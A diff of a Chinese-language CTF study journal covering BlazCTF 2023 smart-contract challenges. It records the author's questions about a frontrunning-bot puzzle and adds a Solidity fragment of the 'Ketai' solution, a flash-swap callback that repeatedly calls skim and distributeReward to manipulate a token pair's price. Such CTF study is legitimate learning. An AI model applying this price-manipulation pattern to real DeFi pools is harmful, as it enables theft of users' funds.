@@ -132,7 +132,7 @@ blazectf 后面题太难了，tony疯了我也疯了，要是都像amazex dss Pa
 [evm_puzzles10](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles10/)
 
 ### 2024.9.18
-[blazctf-2023 4]再过两天blazctf2024来了，之前看过几道简单的，后面实在有点难，不打算单独创一个仓库了，就在这写了
+[blazctf-2023 Hide on bush]再过两天blazctf2024来了，之前看过几道简单的，后面实在有点难，不打算单独创一个仓库了，就在这写了
 
 这个题我有点疑惑，他本质是一个抢跑机器人，通过攻击合约调用Challenge合约的Claim函数，Claim函数通过AirdropDistributor合约的Claim函数执行检查，返回转账金额最后转账，不过在这里会执行FrontrunBot合约的go函数，这为什么是个0地址？没有比赛环境，这里应该是抢跑机器人的地址，而且传参每次都new一个空的bytes[]，这个是真不理解为什么。
 ``` solidity
@@ -218,4 +218,40 @@ function go(bytes[] calldata data) external payable onlyOwner {
 他的意思应该是当我们使用makemoney想要转账的时候会触发抢跑机器人，而根据逻辑最后还是会调用这个合约的claim函数向我么转账。不过我不理解，在这题抢跑机器人不是只有owner调用吗，为什么我这个只是调用转账也会触发？
 
 最后审核的时候能帮忙解答一下吗哈哈。
+
+### 2024.9.20
+[blazctf-2023 Ketai]
+这个题看了两天，题解太敷衍了，不太看得懂，大体意思是说每次买卖的时候会有差价，利用三明治攻击，在低点买入，高点卖出。同时利用闪电兑换贷款进行更高价格的价格操纵。
+```solidity
+function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        console.log("start balance", chal.ketai().balanceOf(address(this)));
+
+        for (uint256 c = 0; c < 25; c++) {
+            uint256 ketaiBalance = chal.ketai().balanceOf(address(this));
+            chal.ketai().transfer(address(chal.ketaiUSDTPair()), ketaiBalance / 10);
+            for (uint256 i = 0; i < 200; i++) {
+                chal.ketaiUSDTPair().skim(address(chal.ketaiUSDTPair()));
+            }
+            chal.ketaiUSDTPair().skim(address(this));
+            KetaiToUSDT(ketaiBalance * 9 / 10);
+            uint256 usdtBalance = chal.usdt().balanceOf(address(this));
+
+            for (uint256 i = 0; i < 100 / (c + 1); i++) {
+                chal.ketai().distributeReward();
+            }
+
+            USDTToKetai(usdtBalance);
+        }
+```
+这是攻击的主要代码，但是不理解为什么要连续调用那么多次skim，也没弄清楚攻击逻辑。
+
+### 2024.9.21
+做blazctf2024，感觉真正做题和做以前的github里面的题感觉大不相同，要自己去找数据，下载题目
+### 2024.9.22
+因为不怎么用telegram今天一登陆发现错过了1000多信息，也发现原来要在那上面请假才算，，，
+
+blazctf2024做出了两道，等明天比赛结束了写
+
+https://github.com/JadeLight7/blazctf2024/tree/main
+
 <!-- Content_END -->
